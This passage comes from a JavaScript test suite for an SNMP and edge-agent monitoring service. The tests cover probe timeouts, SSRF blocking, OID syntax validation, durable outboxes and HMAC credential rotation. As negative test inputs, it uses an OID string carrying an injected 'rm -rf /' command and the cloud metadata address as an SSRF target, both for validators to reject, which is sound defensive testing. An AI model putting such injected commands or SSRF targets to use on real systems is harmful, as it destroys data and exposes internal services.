      const { snmpEngine } = require('../src/protocols/snmp-engine');
      const snmpTimeoutRes = await snmpEngine.probeDevice('127.0.0.1', 'public', { port: 59997, timeoutMs: 250, retries: 0 });
      assert.equal(snmpTimeoutRes.success, false);
      assert.equal(snmpTimeoutRes.isAuthoritativeSnmp, false);
      assert.equal(snmpTimeoutRes.telemetryProvenance, 'UNREACHABLE_TIMEOUT');

      const multiSig = await agentlessCollector.profileDeviceMultiSignal('127.0.0.1', { timeoutMs: 300, ports: [3000] });
      assert.equal(multiSig.isAuthoritativeSnmp, false);
      assert.equal(multiSig.telemetryProvenance, 'INFERRED_MULTI_SIGNAL');
      assert.equal(multiSig.deviceLiveness, 'ONLINE_SNMP_UNREACHABLE');
    });

    it('enforces SSRF target validation and ASN.1 OID syntax guards on SNMP walkOid and walkInterfaces', async () => {
      const { snmpEngine } = require('../src/protocols/snmp-engine');
      assert.equal(snmpEngine.isValidOidSubtree('1.3.6.1.2.1.2.2.1'), true);
      assert.equal(snmpEngine.isValidOidSubtree('1.3.6.1; rm -rf /'), false);

      const ssrfWalk = await snmpEngine.walkOid('169.254.169.254', '1.3.6.1.2.1.2.2.1');
      assert.equal(ssrfWalk.success, false);
      assert.equal(ssrfWalk.telemetryProvenance, 'BLOCKED_UNSAFE_TARGET');

      const badOidWalk = await snmpEngine.walkOid('127.0.0.1', 'invalid_oid_string');
      assert.equal(badOidWalk.success, false);
      assert.equal(badOidWalk.telemetryProvenance, 'INVALID_OID_FORMAT');
    });

    it('persists EdgeAgentDaemon offline outbox across daemon restarts via SQLite/disk and enforces HMAC credential rotation/revocation', async () => {
      const daemon1 = new EdgeAgentDaemon({ agentId: 'agent-lon-01' });
      daemon1.clearDurableOutbox();

      // Verify static legacy secret is rejected
      assert.equal(
        edgeAgentService.verifyAgentAuth('agent-lon-01', 'ejii_token_agent-lon-01_secret'),
        false,
        'Static legacy token must be rejected by verifyAgentAuth'
      );

      // Enqueue offline result in daemon1
      daemon1._postTaskResult = async () => {
        throw new Error('Simulated control plane unreachable');
      };
      const qRes = await daemon1.submitTaskResult('task-durable-restart-01', { status: 'OPEN', latencyMs: 1.4 }, 3);
      assert.equal(qRes.queuedForRetry, true);

      // Instantiate a brand-new EdgeAgentDaemon instance (simulating process restart) and verify durable outbox survived
      const daemon2 = new EdgeAgentDaemon({ agentId: 'agent-lon-01' });
      const recoveredItem = daemon2.pendingResultQueue.find((item) => item.taskId === 'task-durable-restart-01');
      assert.ok(recoveredItem, 'Offline queued task result must survive EdgeAgentDaemon restart via durable outbox');
      assert.equal(recoveredItem.leaseEpoch, 3);
      daemon2.clearDurableOutbox();

      // Enroll a transient agent and test credential rotation + revocation
      const enrolled = edgeAgentService.enrollAgent({
        name: 'Transient Rotation Test Agent',
        siteId: 'site-hq-lon',
        hostname: 'rot-test.corp',
        platform: 'linux',
        ipAddress: '10.10.99.99',
        observedSubnets: ['10.10.99.0/24']
      });
      assert.equal(edgeAgentService.verifyAgentAuth(enrolled.agentId, enrolled.secretKey), true);

      const rotated = edgeAgentService.rotateAgentCredential(enrolled.agentId);
      assert.equal(rotated.success, true);
      assert.equal(edgeAgentService.verifyAgentAuth(enrolled.agentId, enrolled.secretKey), false, 'Old key must be invalid after rotation');
      assert.equal(edgeAgentService.verifyAgentAuth(enrolled.agentId, rotated.newSecretKey), true, 'New rotated key must authenticate');

      const revoked = edgeAgentService.revokeAgent(enrolled.agentId, 'Unit test revocation');
      assert.equal(revoked.success, true);
      assert.equal(edgeAgentService.verifyAgentAuth(enrolled.agentId, rotated.newSecretKey), false, 'Revoked agent must not authenticate');
    });
  });

});


